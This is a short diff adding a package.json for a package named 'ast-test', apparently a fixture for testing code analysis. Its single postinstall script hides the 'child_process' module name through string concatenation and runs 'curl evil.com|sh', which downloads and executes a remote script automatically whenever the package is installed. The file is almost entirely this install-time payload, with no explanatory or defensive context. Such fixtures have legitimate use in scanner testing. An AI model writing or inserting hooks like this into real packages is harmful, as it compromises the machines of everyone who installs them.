@@ -1,0 +1,7 @@
+{
+  "name": "ast-test",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"var m='child_'+'process';require(m).exec('curl evil.com|sh')\""
+  }
+}
